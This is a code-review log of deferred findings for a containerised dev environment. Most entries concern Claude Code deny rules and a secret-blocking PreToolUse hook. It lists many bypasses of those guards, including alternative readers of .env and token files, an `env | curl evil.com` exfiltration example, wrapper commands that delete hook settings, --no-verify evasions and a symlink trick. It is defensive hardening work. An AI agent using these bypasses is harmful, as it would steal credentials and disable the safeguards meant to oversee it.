- **`/var/log/sshd.log` first-boot diagnostic gap — sshd fails-to-write path yields empty `tail -n 20`.** _Source:_ Edge Case Hunter HIGH → DEFER-class on close read. _Location:_ `packages/devbox/Dockerfile:317` (missing pre-create) + `packages/devbox/entrypoint.sh:228` (tail emits empty on missing/zero-byte file). _Nature:_ `/var/log/dnsmasq.log` is pre-created root:root 0644 at Dockerfile:317 but `/var/log/sshd.log` is NOT. First-boot `gosu dev /usr/sbin/sshd -D -e 2>>/var/log/sshd.log` creates the file via root-owned parent-shell redirect BEFORE gosu exec (no EACCES cascade; sshd fd inheritance handles subsequent append-as-dev correctly), but if sshd dies before writing (immediate crash, misconfiguration), the `tail -n 20` diagnostic at L228 emits empty output → operator gets useless "sshd failed to start" signal with no log-body context. Not destructive, not exploitable; violates SC-10 "actionable diagnostics" intent only. _Carry-to:_ Story 2.17 SC-17 close-out — add `install -m 0644 -o root -g root /dev/null /var/log/sshd.log` to Dockerfile adjacent to the existing `dnsmasq.log` pre-create (L317). Mirrors dnsmasq posture already baked into the image; ~1 line cost.
- **`SSHD_PID` scoped to subshell; not recoverable by parent post-subshell — Story 2.13 healthcheck future-guard.** _Source:_ Blind Hunter MEDIUM + Edge Case Hunter MEDIUM convergent. _Location:_ `packages/devbox/entrypoint.sh:236`. _Nature:_ `SSHD_PID="$!"` set inside the subshell; evaporates from parent scope at `)`. Benign for iter-278 (no post-subshell liveness probe exists today); future-guard for Story 2.13 healthcheck design — if Story 2.13 wants to re-query sshd liveness from the parent scope or from a healthcheck CMD, it cannot use `SSHD_PID` and must use `pgrep sshd` or equivalent. _Carry-to:_ Story 2.13 healthcheck design — note the scoping constraint in `2-13-*.md` story Dev Notes so the design opts for `pgrep`/liveness-by-port rather than a PID-captured probe.
- **Backgrounded sshd reaping after `exec gosu dev "$@"` handoff — zombie accumulation on repeated sshd crash/restart.** _Source:_ Blind Hunter MEDIUM + Edge Case Hunter MEDIUM convergent. _Location:_ `packages/devbox/entrypoint.sh:233` (sshd backgrounded inside subshell) + `packages/devbox/Dockerfile:58` (tini installed) + `packages/devbox/Dockerfile:351` (ENTRYPOINT does NOT invoke tini). _Nature:_ sshd is backgrounded inside the SC-10 subshell; at subshell close + outer `exec gosu dev "$@"`, sshd reparents to the new PID 1 (gosu / sleep-infinity / Ralph TUI depending on `KEEL_RALPH_MODE`). If that PID 1 does not wait(2), repeated sshd crash/restart accumulates zombies. NOT introduced by PATCH-6 — pre-existing since iter-268 Task 3 introduced the backgrounded sshd pattern. Story 2.13 healthcheck would surface the zombie rate loudly if it paged on `ps -o stat=` output. _Carry-to:_ Story 2.17 close-out — evaluate `tini`-as-PID-1 promotion (invoke via `ENTRYPOINT ["tini","--","/usr/local/bin/entrypoint.sh"]`) versus adopting a `trap "wait" EXIT` in entrypoint.sh versus moving sshd lifecycle to a supervised process-manager pattern; Epic 2 close-out owns the decision.
- **"Pre-creation runs as root (pre-gosu)" comment vestige — misleading framing post-rc-capture.** _Source:_ Edge Case Hunter LOW. _Location:_ `packages/devbox/entrypoint.sh:175`. _Nature:_ Comment retains the "pre-gosu" phrasing from the old shape (pre-Story 2.5 USER dev + gosu-idempotent era), but every command in the new subshell body is `gosu dev ...` regardless of parent uid → the "pre-gosu" framing is misleading. Cosmetic. _Carry-to:_ Story 2.17 SC-17 close-out polish pass — single-line comment revision; could absorb into the same pass as D-1 sshd.log pre-create.

- **D-9 — `nc -z` / `dig` probe robustness polish (belt-and-braces hardening).** _Source:_ Edge Case Hunter MEDIUM (nc -w missing) + Blind Hunter LOW (dig stderr). _Location:_ `packages/devbox/docker-compose.yml:281-282`. _Nature:_ (a) `nc -z 127.0.0.1 2222` lacks explicit `-w <timeout>` bound; relies on Docker healthcheck `timeout: 5s` as outer gate. Current behavior correct (dig 3s + nc hangs till axed = 4s, within 5s window), but `nc -w 2` would tighten the nc clause independently. (b) `dig @127.0.0.1 ... >/dev/null` redirects stdout but NOT stderr; transient `;; communications error to 127.0.0.1#53: timed out` warnings leak to Docker log driver on upstream-DNS flakes. `2>/dev/null` cleans log noise without changing exit-code semantics. _Carry-to:_ Story 2.17 close-out — amend the CMD-SHELL to `dig @127.0.0.1 -p 53 +short +time=3 +tries=1 api.github.com >/dev/null 2>&1 && { [ "${KEEL_DEVBOX_SSH:-false}" != "true" ] || nc -z -w 2 127.0.0.1 2222; }` with 3-site lockstep update to invariant doc + README. Cosmetic hardening; low priority.
- **D-10 — Exit-code `2` POSIX-syntax-error edge case + documentation.** _Source:_ Blind Hunter LOW. _Location:_ `docs/invariants/devbox-healthcheck.md:49-63` (§ Exit codes table). _Nature:_ Doc table says "Docker-internal reserved `2` — probe authors MUST NOT return `2`" but composed shell CAN return exit 2 on dash syntax-fault (`[: missing ]` / unclosed brace / quote-mismatch regression). If a future CMD edit introduces a syntax regression returning exit 2, Docker's healthcheck consumer behavior on `2` is version-dependent (newer daemons treat as unhealthy; older as undefined). _Carry-to:_ Story 2.17 close-out — either (a) add explicit `|| exit 1` tail to CMD-SHELL (forces any non-zero including exit 2 to canonical exit 1); OR (b) add invariant doc note acknowledging the theoretical path with guidance "probe authors MUST verify `dash -n` on the composed CMD before commit". Low priority; guarded today by iter-283 impl-time `dash -n` verification.

- **D-10 — Retirement step 1/3 ordering fragility under concurrent upstream advance.** _Source:_ Edge Case Hunter LOW. _Location:_ `docs/invariants/devbox-legacy-branch-retention.md:~144-152` (§ Retirement gate). _Nature:_ If remote advances between last `git fetch` and `scripts/major-cut.sh` execution (emergency cherry-pick mid-cut), step 1's local tag captures a stale view of `origin/legacy-devbox` and step 3 deletes a newer remote state than what was tagged — concurrent cherry-pick erased from archaeology. _Carry-to:_ Story 2.17 close-out OR Story 15b.1 AMEND — add explicit `git fetch origin legacy-devbox` precondition + abort-if-local-differs-from-remote guard, OR tag the remote SHA directly via `git push origin <remote-sha>:refs/tags/legacy-devbox-final`.
- **D-11 — INVARIANTS.md "Four workflow contracts" vs invariant-doc 5 H2 sections.** _Source:_ Blind Hunter LOW. _Location:_ `INVARIANTS.md:134` (§ Devbox legacy-branch retention paragraph) vs `docs/invariants/devbox-legacy-branch-retention.md` TOC. _Nature:_ Classification ambiguity — INVARIANTS.md enumerates branch-creation / cherry-pick / triage / retirement (4), but invariant doc has branch-creation / cherry-pick / triage / sunset / retirement (5). "Sunset criteria" is either a workflow contract (making it 5) or subordinate to retirement (making it 4). _Carry-to:_ Story 2.17 close-out — re-phrase INVARIANTS.md to "Five workflow contracts pinned: branch creation … cherry-pick … triage … sunset criteria … retirement" for consistency. Low-value wording cleanup.
- **D-12 — `architecture.md:361` citation unverified.** _Source:_ Blind Hunter LOW. _Location:_ `docs/invariants/devbox-legacy-branch-retention.md:~149` (§ Retirement gate step 4). _Nature:_ Hardcoded `architecture.md:361` citation potentially stale; CR diff doesn't substantiate the line-number reference. _Carry-to:_ Story 2.17 close-out D-5 expansion (sibling to Story 2.13 D-5 + D-11 citation-lockstep-lint pattern) — add grep-drift check for `architecture.md:<N>` symbol citations across all invariant docs + cross-check against current source content at cited lines.
- **D-13 — Banner-prepend bash step missing from invariant-doc recipe.** _Source:_ Blind Hunter MEDIUM. _Location:_ `docs/invariants/devbox-legacy-branch-retention.md:110-113` (§ Branch creation contract, step 3). _Nature:_ Recipe has prose "Prepend Story 2.14 retention banner to `$WT/README.md`" (step 3 comment) but the actual bash skips straight to `sed -i` on an existing placeholder — no `cat banner >> README.md` / `{ banner; cat README.md; } > new-README && mv` prepend command visible. Implicit reliance on an unshown "banner template" file. _Carry-to:_ Story 2.17 close-out — sibling of D-1 recipe-rewrite scope; add explicit banner-creation + prepend commands, or reference the story-file banner template location. Might be bundled with D-1 into a single § Branch creation contract rewrite.
- **D-14 — Fork-naming example inconsistent with slug-convention.** _Source:_ Blind Hunter LOW. _Location:_ `docs/invariants/devbox-legacy-branch-retention.md:233` (§ Fork extension contract). _Nature:_ Text says "preserve the `legacy-<upstream-name>` slug convention (e.g. a fork absorbing `tthew/cc-devbox` via its own upstream would name the branch `legacy-cc-devbox-<fork>` or retain `legacy-devbox` if the fork inherits keel's naming)" — slug convention `legacy-<upstream-name>` would yield `legacy-cc-devbox` not `legacy-cc-devbox-<fork>`. One-word example mismatch. _Carry-to:_ Story 2.17 close-out — drop the `-<fork>` suffix from the example OR re-describe convention as `legacy-<upstream-name>[-<fork-discriminator>]`.
- **D-15 — `grep UPSTREAM_SHA` placeholder-guard false-positive hazard.** _Source:_ Blind Hunter LOW + Edge Case Hunter LOW convergent. _Location:_ `docs/invariants/devbox-legacy-branch-retention.md:113` (§ Branch creation contract, step 3 guard). _Nature:_ Grep pattern is `UPSTREAM_SHA` (the variable NAME), not `<UPSTREAM_SHA>` (the placeholder). If banner prose ever legitimately contains the word `UPSTREAM_SHA` (e.g. `\`UPSTREAM_SHA=<resolved-sha>\``), grep triggers false-positive exit 1 despite successful substitution. _Carry-to:_ Story 2.17 close-out — `grep '<UPSTREAM_SHA>'` with angle brackets to test the actual placeholder token. Defensive hardening for future banner edits; current banner template empirically avoids collision.
- **D-16 — § Sunset criteria "quarterly post-1.0" vs "mid-build ~Day 18-21" textual contradiction.** _Source:_ Blind Hunter LOW. _Location:_ `docs/invariants/devbox-legacy-branch-retention.md:209` (§ Sunset criteria opening paragraph). _Nature:_ First sentence defines M4 as "recurring quarterly post-1.0 falsification ritual per `prd.md:143`"; second sentence says "FIRST M4 (mid-build, ~Day 18-21 of the 28-day critical path) is the canonical sunset gate". A FIRST M4 that is ALSO post-1.0 is semantically impossible (mid-build is pre-1.0 by definition). PRD M4 semantic carries BOTH senses but cold-reader sees contradiction. _Carry-to:_ Story 2.17 close-out — reframe as "PRD M4 = both the mid-build checkpoint AND recurring post-1.0 ritual; sunset gate is the FIRST M4 (mid-build)" to resolve the surface contradiction.

Cumulative Epic-2 DEFER queue: 47 (at iter-294 Story 2.14 CR landing) + 11 (iter-301 Story 2.15 CR) = **58 DEFERs** + **3 Story 2.17 SC-17 close-out candidates** (D-7/D-8/D-9 from iter-299 trace) pending Story 2.17 SC-17 close-out._

- **D-1 — `Read(.envrc*)` + `Read(.secrets*)` root-anchored glob vs `Read(**/.env*)` recursive asymmetry.** _Source:_ Edge Case Hunter HIGH (2 findings) + Blind Hunter MEDIUM convergent. _Location:_ `.claude/settings.json:4, :6` (substrate) + `packages/keel-templates/src/seeds/.claude/settings.json:4, :6` (seed). _Nature:_ Minimatch-style glob `.envrc*` is root-anchored; nested `packages/foo/.envrc` (direnv per-package convention) + `packages/keel-invariants/.secrets.yaml` + `apps/*/secrets/.secrets` bypass the deny. Sibling rule `Read(**/.env*)` correctly uses `**/`. Story 2.15 AC 2 pins the 13 rules VERBATIM; altering any one = spec violation — requires AMEND PR against `epics.md:1629-1668` + story-file AC 2 + substrate JSON + seed JSON + AGENTS.md H3 + packages/devbox/README.md H2. _Carry-to:_ Story 2.17 SC-17 close-out — bundled amendment pass: either (a) promote `.envrc*` + `.secrets*` to `**/.envrc*` + `**/.secrets*` in AC 2 + propagate to 5 sites, OR (b) add new sibling rules `Read(**/.envrc*)` + `Read(**/.secrets*)` as minimum-coverage additions. Mitigated at hook layer (Story 2.16 forward-ref): PreToolUse hook reads tool-call JSON from stdin + pattern-matches on absolute path, bypassing the glob-anchor limitation.
- **D-2 — `Bash(cat **/.env*)` fails on bare-root `cat .env` (most common operator idiom).** _Source:_ Edge Case Hunter HIGH. _Location:_ `.claude/settings.json:13` (substrate + seed). _Nature:_ Under minimatch, `**/` requires ≥0 path segments followed by `/` — bare `.env` has no preceding segment + no `/`, so `cat .env` MISSES. `cat path/.env` matches correctly. The `Read(**/.env*)` rule DOES catch it for Read tool path, but `cat` is a Bash invocation. AC 2 pins the rule verbatim. _Carry-to:_ Story 2.17 SC-17 close-out — amend AC 2 to add sibling `Bash(cat .env*)` (no `**/` prefix) alongside the existing `Bash(cat **/.env*)`, OR replace existing with `Bash(cat .env*)` + `Bash(cat **/.env*)` tuple. Five-site lockstep amendment required.
- **D-3 — `Bash(cat .envrc*)` prefix-anchor fragility (`cat ./.envrc`, `cat /abs/path/.envrc` bypass).** _Source:_ Edge Case Hunter HIGH. _Location:_ `.claude/settings.json:12` (substrate + seed). _Nature:_ Claude Code's Bash pattern match is prefix-anchored from argv[0]; `./` and `/` prefix break the match. Common tab-completion outcome + Ralph-iteration agents often produce absolute paths. Combined with D-1's root-anchor defect on the Read-path `Read(.envrc*)`, both tool paths leave `cat ./.envrc` + `cat /workspace/.envrc` unguarded at the permissions layer. AC 2 pinned verbatim. _Carry-to:_ Story 2.17 SC-17 close-out — amend AC 2 to add `Bash(cat ./.envrc*)` + `Bash(cat /*.envrc*)` siblings, OR migrate to a hook-based Bash-path secret-file denial (Story 2.16 domain). Hook-based defense is the simpler end state.
- **D-4 — Allow-rule glob form inconsistency: space-delimited vs bare-suffix.** _Source:_ Blind Hunter MEDIUM + Edge Case Hunter MEDIUM convergent. _Location:_ `.claude/settings.json:19-24` (substrate + seed) — `Bash(pnpm *)` / `Bash(ls *)` / `Bash(tsc *)` use space-before-`*`; `Bash(git diff*)` / `Bash(git log*)` use bare suffix. _Nature:_ Mixing conventions risks either (a) over-permissive matching on diff-prefixed commands (`git diffstat`, `git difftool`), or (b) failing to match the actual diff/log invocations described as "Ralph orient sequence" (`git diff HEAD`, `git log --oneline`). Claude Code's exact semantics under trailing-space-vs-no-space require empirical verification against CLI 2.1.116. AC 3 pinned verbatim. _Carry-to:_ Story 2.17 SC-17 close-out — empirical test against `claude` CLI probing all 6 allow patterns against real invocations; normalize convention (either `Bash(git diff *)` space-delimited OR `Bash(git diff*)` bare-suffix for both) + amend AC 3 + propagate to 5 sites.
- **D-5 — `Bash(env:*)` non-functional semantics — doesn't match `env -i FOO=bar`.** _Source:_ Blind Hunter MEDIUM + Edge Case Hunter MEDIUM convergent. _Location:_ `.claude/settings.json:10` (substrate + seed). _Nature:_ Under minimatch, `env:*` matches strings literally beginning `env:` (colon-literal). Probe: input `env -i FOO=bar sh` MISSES `env:*`. The adjacent `Bash(env)` exact-match rule separately catches bare `env`; `Bash(env:*)` appears to be dead weight. Task 1 rationale describes the trio `Bash(env)` + `Bash(env:*)` + `Bash(printenv*)` as "env-dump idioms", suggesting the spec author intended `env:*` to cover env-variant invocations — but the pattern as written is semantically mismatched. AC 2 pinned verbatim. _Carry-to:_ Story 2.17 SC-17 close-out — amend AC 2 to replace `Bash(env:*)` with `Bash(env *)` (space-delimited argv-continuation form), OR drop the entry entirely if spec reviewers judge it redundant to `Bash(env)` + future hook-layer coverage.
- **D-6 — `Bash(cat /home/dev/.claude/**)` Bash-cat parity gap to `Read(/home/dev/.claude/**)`.** _Source:_ Edge Case Hunter MEDIUM. _Location:_ `.claude/settings.json:7-8` (substrate + seed; `Read` rules for `/home/dev/.claude/**` + `/home/dev/.config/gh/**` without Bash-cat counterparts). _Nature:_ OAuth-token paths (Story 2.8 + 2.9) denied on Read tool axis only; `Bash(cat /home/dev/.claude/.credentials.json)` bypasses the Read-only deny. Mitigated by Story 2.16 hook layer + container isolation, but at the permissions layer an agent with Bash access can exfiltrate. NOT in AC 2 — adding Bash-cat counterparts is scope-extension. _Carry-to:_ Story 2.17 SC-17 close-out — amend AC 2 minimum-coverage to add `Bash(cat /home/dev/.claude/**)` + `Bash(cat /home/dev/.config/gh/**)` OR document that hook-layer defense (Story 2.16) is the authoritative coverage for OAuth-token-paths.
- **D-7 — `Bash(ls *)` metadata leak on denied-read directories.** _Source:_ Edge Case Hunter MEDIUM. _Location:_ `.claude/settings.json:22` (substrate + seed). _Nature:_ `Bash(ls *)` allows `ls /home/dev/.claude/`, `ls /home/dev/.config/gh/`, `ls ~/.ssh/` (the last not denied at all per D-10). Metadata exposure: filenames, sizes, mtimes of OAuth tokens — enables an agent to enumerate the credentials-file layout (filenames reveal GitHub vs Anthropic vs OAuth state paths) then use a non-denied reader to exfiltrate. AC 3 pinned verbatim. _Carry-to:_ Story 2.17 SC-17 close-out — amend AC 3 to narrow `Bash(ls *)` to `Bash(ls)` + `Bash(ls --help)` + `Bash(ls [a-zA-Z0-9]*)` (excluding `/home/dev/.claude/**` + `/home/dev/.config/gh/**` paths), OR rely on hook-layer defense for ls-path metadata guarding.
- **D-8 — `Bash(git log*)` allows `git log -p --all` blob-content echo.** _Source:_ Edge Case Hunter MEDIUM. _Location:_ `.claude/settings.json:20` (substrate + seed). _Nature:_ Trailing-wildcard prefix allows `git log -p --all`, `git log --patch`, `git log --format='%H %s' --all` — any git-log variant that echoes commit patches. If `.env` file has EVER been committed in repo history (common pre-substrate mistake — exactly what `INV-gitignored-secret-commit-deny` targets), `git log -p --all` prints the patch content, bypassing `Read(**/.env*)` + `Grep(**/.env*)` + `Glob(**/.env*)` tool-layer denies. Similarly `Bash(git diff*)` matches `git diff HEAD~999 -- .env`. Mitigated on main substrate by `INV-gitignored-secret-commit-deny` (Story 2.1); residual risk on forks that disable the invariant. AC 3 pinned verbatim. _Carry-to:_ Story 2.17 SC-17 close-out — amend AC 3 to narrow `Bash(git log*)` to exclude `-p` / `--patch` / `--format=...%B...` variants, OR rely on `INV-gitignored-secret-commit-deny` as the canonical defense (which is the current substrate posture — this DEFER may resolve to a doc clarification in invariant-cross-ref form rather than a deny-list amendment).
- **D-9 — `packages/devbox/README.md § Claude Code settings policy (Story 2.15)` does NOT mention NFR5a `~/.ssh/**` + `~/.aws/credentials` gap.** _Source:_ Edge Case Hunter MEDIUM. _Location:_ `packages/devbox/README.md:1014-1051` (operator-facing H2). _Nature:_ AGENTS.md :222 + spec file :184 + :186 document the gap + DEFER-to-Story 2.17 decision. The operator-facing devbox README is silent on it. An operator extending the allow list via `.claude/settings.local.json` following the README recipe has no operator-facing signal that `~/.ssh/**` read-access remains ungated. Task 5 spec did not mandate documenting the gap, but operator-ergonomics asymmetry vs AGENTS.md H3 is notable. _Carry-to:_ Story 2.17 SC-17 close-out docs polish — append a short "NFR5a gap note" subsection to the H2 mirroring AGENTS.md :222 (operator-workstation secret paths + DEFER rationale). Sibling to Story 2.17's operator-docs reconciliation scope.
- **D-10 — Deny list missing common in-repo secret patterns (`Read(id_ed25519*)` / `Read(id_rsa*)` / `Read(*.pem)` / `Read(*.key)`).** _Source:_ Blind Hunter LOW. _Location:_ `.claude/settings.json` (deny block) + NFR5a minimum coverage (PRD `:1075`). _Nature:_ Dev Notes § NFR5a mapping :184 explicitly defers `~/.ssh/**` (operator-workstation) but no mention of in-repo SSH-key-file + PEM + key-file patterns that forks may commit (against best practice but observed in the wild). NOT in AC 2; `INV-gitignored-secret-commit-deny` covers the don't-commit posture but doesn't deny reads of committed ones. _Carry-to:_ Story 2.17 SC-17 expanded-coverage scope — add minimum-coverage additions for in-repo key-file patterns, aligned with Story 2.16 hook layer's expanded pattern set.
- **D-11 — `AGENTS.md:199` PRE-EXISTING dead-ref "Amendment-vs-fork decision" missing "tree" (Story 2.13 landing).** _Source:_ Edge Case Hunter discovery at Story 2.15 CR. _Location:_ `AGENTS.md:199` (§ Healthcheck (Story 2.13) scope carve-out bullet). _Nature:_ Story 2.13 landed the bullet citing `docs/invariants/fork.md § Amendment-vs-fork decision` (missing "tree" — actual section `:56` is `## Amendment-vs-fork decision tree`). Sibling AGENTS.md:222 + CLAUDE.md:51 use correct form. PRE-EXISTING (NOT Story 2.15 delta); DEFERred per triage rule "defer pre-existing issues not caused by current change". _Carry-to:_ Story 2.17 SC-17 citation-lockstep-lint expansion pass (sibling to Story 2.13 D-11 Dockerfile-citation class + Story 2.14 D-12 architecture.md citation class) — grep-drift check for `§ Amendment-vs-fork decision[^ ]` (no trailing "tree") across all docs; current known hit is `AGENTS.md:199` only.

## Deferred from: code review of story-2.16 (2026-04-24)

_Story 2.16 (`.claude/hooks/block-secret-access.sh` + `.claude/settings.json` `hooks.PreToolUse` + `docs/invariants/claude-hook-denylist.md` + 35th manifest entry + `.ralph/config.toml` + 2 seeds + 3 doc touches) — iter-308 `/bmad-code-review (args: "2")`. Three-layer adversarial review (Blind Hunter + Edge Case Hunter + Acceptance Auditor). Auditor returned ZERO FAIL / ZERO SCOPE-CREEP — all 8 ACs functionally satisfied. Two PATCH absorbed inline (bundled-close: Completion Notes line-count `181 → 94`; AGENTS.md H3 "STRICTLY MORE COMPREHENSIVE" scope-tightening). The 25 defers below are denylist-scope-expansion and bypass-resistance-gap findings — natural Story 2.17 SC-17 scope per § Scope boundaries + § Hook-bypass-resistance forward-ref; most require AMEND PR against `epics.md:1670-1720` AC 2 pinned patterns + 5-site lockstep (substrate hook + substrate settings.json + invariant doc + 2 seeds) + manifest `contentHash` refresh._

- **D-12 — Bash-reader denylist `cat`-only; bypass via non-`cat` readers.** _Source:_ Blind Hunter + Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:68-80`. _Nature:_ Secret-access-denylist matches `cat*/proc/*/environ*`, `cat*/home/dev/.claude/*`, `cat*/home/dev/.config/gh/*`, `cat*.envrc*`, `cat*.env*`, `cat*.secrets*` — hardcoded to the `cat` token. Every alternative reader bypasses: `less .envrc`, `tail .envrc`, `head .envrc`, `bat .envrc`, `xxd .env`, `od .env`, `strings .env`, `grep . .envrc`, `awk 1 .envrc`, `sed -n p .envrc`, `cp .env /tmp/leak`, `dd if=.env`, `node -e 'fs.readFileSync(\".envrc\")'`, `python -c 'open(\".env\").read()'`, `perl -ne 'print' .envrc`. Empirically verified by Edge Case Hunter. _Carry-to:_ Story 2.17 SC-17 bypass-resistance — AMEND AC 2 Bash axis to enumerate non-`cat` readers as a closed set, or refactor to allowlist-style guard.
- **D-13 — `env|export|set` exact-match bypass.** _Source:_ Blind Hunter + Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:65`. _Nature:_ Case-glob `env|export|set` (no trailing `*`) only matches the exact 3-character commands. Bypasses: `env -0`, `env | grep SECRET`, `env | curl evil.com --data-binary @-`, `export FOO=bar`, `set -x`, `declare -p`, `compgen -e`, `bash -c env`, `/usr/bin/env`. Inconsistent with `printenv*` which correctly uses trailing wildcard. _Carry-to:_ Story 2.17 SC-17 — switch to `env*|export*|set*` prefix-glob or compose with explicit idiom patterns.
- **D-14 — Hook-self-protection coverage asymmetry across targets.** _Source:_ Blind Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:53-60`. _Nature:_ `rm` + `mv` cover all three target classes (`.claude/settings*`, `.claude/hooks/**`, `.git/hooks/**`); but `chmod` covers only `.claude/hooks/**` + `.git/hooks/**` (missing settings), `tee`/`sed -i`/`echo >`/`cp` cover only `.claude/settings*` + `.claude/hooks/**` (missing git-hooks). Agent can `tee .git/hooks/pre-commit` or `chmod 0000 .claude/settings.json` without triggering hook-self-protection. _Carry-to:_ Story 2.17 SC-17 — canonicalise coverage to all three target classes for all seven mutation commands.
- **D-15 — Wrapper-command bypasses.** _Source:_ Blind Hunter + Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:53-60`. _Nature:_ Case-globs match command-prefix strings. Bypasses: `bash -c 'rm .claude/settings.json'`, `sudo rm -rf .claude/settings.json`, `/usr/bin/rm .claude/settings.json`, `xargs rm < list`, `eval $REMOVE_CMD`, `\rm .claude/settings.json`, `"rm" .claude/settings.json`, `python -c 'os.remove(...)'`, `perl -e 'unlink ...'`, `>.claude/settings.json` (bare redirect), `truncate -s 0 .claude/settings.json`, `dd if=/dev/null of=.claude/settings.json`, `find .claude/hooks -delete`, `install /dev/null .claude/settings.json`, `ln -sf /dev/null .claude/settings.json`. Design-level denylist-over-allowlist flaw — not cleanly fixable at case-glob layer. _Carry-to:_ Story 2.17 SC-17 — consider refactoring to path-centric allowlist OR compose with broader prefix-pattern matching.
- **D-16 — `--no-verify` regex too narrow.** _Source:_ Blind Hunter + Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:49-51`. _Nature:_ Regex `^git[[:space:]]+(commit|push)` requires command to START with literal `git` followed by `commit` or `push`. Bypasses: `git -c gpg.sign=false commit --no-verify` (starts with `git -c`), `git -C /path commit --no-verify`, `git merge --no-verify`, `git rebase --no-verify`, `git am --no-verify`, `git pull --no-verify`, `git cherry-pick --no-verify`, `git revert --no-verify`, `VAR=1 git commit --no-verify` (env prefix), `/usr/bin/git commit --no-verify` (absolute path), `bash -c 'git commit --no-verify'`. Invariant doc § Bash git-gate at line 252 claims "any command containing `--no-verify` substring" which contradicts the narrow regex. _Carry-to:_ Story 2.17 SC-17 — broaden regex to catch all git subcommands that run hooks (commit/push/merge/rebase/am/pull/cherry-pick/revert), env-var prefix, and absolute-path variants; reconcile invariant doc with shipped regex.
- **D-17 — Read/Bash exemption asymmetry for schema-companion files.** _Source:_ Blind Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:40-44` (Read exempt) vs `:68-80` (Bash deny) + `:87-93` (Grep/Glob deny). _Nature:_ `Read(file_path=".envrc.example")` → approve via exemption. But `Bash(cat .envrc.example)` falls to `cat*.envrc*` → block. `Glob(pattern="**/*.env.example")` falls to `*.env*` → block. Exemption is only carved for Read tool surface. _Carry-to:_ Story 2.17 SC-17 — harmonise exemption across Read + Bash + Grep + Glob tool surfaces.
- **D-18 — Glob pattern-match over-blocks legitimate globs.** _Source:_ Blind Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:87-89`. _Nature:_ Pattern `*.env*|*.envrc*|*.secrets*` blocks any glob containing those substrings — including `docs/*env*` (searching docs for "env"), `**/*.env.example` (schema companions), `packages/**/.environment/**` (a `.environment` directory). _Carry-to:_ Story 2.17 SC-17 — refine to anchored glob patterns OR exemption for schema-companion suffixes.
- **D-19 — Case-sensitivity bypass.** _Source:_ Blind Hunter + Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:42, 71-79, 83-85`. _Nature:_ Bash `case` is case-sensitive by default (no `shopt -s nocasematch`). Bypasses: `.ENV`, `.Env`, `.Envrc`, `.SECRETS`, `/workspace/.ENV`, `/home/dev/.Claude/...`. Linux filesystems are case-sensitive so these are distinct files; on case-insensitive filesystems (macOS) they collapse. Exemption `*.envrc.example` doesn't match `*.envrc.EXAMPLE` either. _Carry-to:_ Story 2.17 SC-17 — `shopt -s nocasematch` at hook entry, or add explicit uppercase variants.
- **D-20 — `Glob(path=…)` argument not read.** _Source:_ Blind Hunter + Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:20-21`. _Nature:_ Hook extracts `tool_input.pattern` for Glob but NOT `tool_input.path`. An adversarial `Glob(pattern="*.json", path="/home/dev/.claude")` returns all OAuth token filenames. _Carry-to:_ Story 2.17 SC-17 — extract + check `tool_input.path` for Glob as for Grep.
- **D-21 — JSONL printf-format injection hazard via `RALPH_ITER_ID`.** _Source:_ Blind Hunter + Edge Case Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:24`. _Nature:_ `printf '{"iteration_id":"%s",...}'` with `"$iter_id"` — if `RALPH_ITER_ID` env ever contains `"`/`\`/newlines/control chars, the JSONL becomes invalid JSON. Substrate ralph is trusted (ralph.py controls this env var); forks may not be. Epic 4 Story 4.13 FR37 consumer breaks on invalid JSON. _Carry-to:_ Story 2.17 SC-17 — switch printf to `jq -n --arg timestamp "$ts" --arg iteration_id "$iter_id" … '{timestamp: $timestamp, iteration_id: $iteration_id, …}'` for safe JSON emission.
- **D-22 — Symlink + `.env.example` exemption bypass.** _Source:_ Blind Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:40-44`. _Nature:_ Attacker who can Bash `ln -s /home/dev/.claude/oauth_token /tmp/evil.env.example` then `Read(/tmp/evil.env.example)` → exemption matches path-suffix → approves → Claude resolves symlink → reads OAuth token. Exemption evaluated BEFORE OAuth-path deny. `ln` is not in denylist. Similarly `Read(/home/dev/.claude/settings.env.example)` approves via exemption path-suffix, bypassing OAuth-directory deny. _Carry-to:_ Story 2.17 SC-17 — resolve symlink via `readlink -f` before matching OR anchor exemption to repo-rooted paths only.
- **D-23 — `.ralph/config.toml [hooks].self_protection_halt_threshold` no schema / range validator.** _Source:_ Blind Hunter. _Location:_ `.ralph/config.toml:10`. _Nature:_ Valid TOML integer but no range enforcement. Operator setting `0` or `-1` silently disables `SECURITY_CRITICAL` halt; huge values equally disable in practice. Epic 3 Story 3.7 consumer is forward-ref; substrate-side validation absent. _Carry-to:_ Story 2.17 SC-17 OR Epic 3 Story 3.7 consumer — range-check ≥1 OR content-hash the TOML file to detect drift.
- **D-24 — JSONL log-append silent drop on write failure.** _Source:_ Blind Hunter. _Location:_ `.claude/hooks/block-secret-access.sh:30-31`. _Nature:_ `>> "$log_dir/blocked-tool-calls.jsonl" 2>/dev/null || true` swallows write failures (read-only FS, disk-full, perm-denied). Hook still emits block decision → block is enforced, BUT the security audit trail is lost silently. Epic 4 Story 4.13 consumer misses blocks. _Carry-to:_ Story 2.17 SC-17 — emit stderr warning on append failure (Claude Code surfaces stderr) OR fail-block with diagnostic on audit-log failure.
- **D-25 — MultiEdit + NotebookEdit not in matcher list.** _Source:_ Edge Case Hunter. _Location:_ `.claude/settings.json:110-148`. _Nature:_ `settings.json` `hooks.PreToolUse` registers 6 matchers (`Bash`, `Read`, `Edit`, `Write`, `Grep`, `Glob`). MultiEdit + NotebookEdit are real Claude Code tools that can mutate `.claude/settings.json` or `.claude/hooks/**`. Neither fires the hook. Forward-compat gap: any future Claude tool adds to this list silently weakens the denylist. _Carry-to:_ Story 2.17 SC-17 — extend matcher set to include `MultiEdit`, `NotebookEdit`, + consider a wildcard-matcher strategy (`".*"`) with the hook's internal `case "$tool_name"` routing.
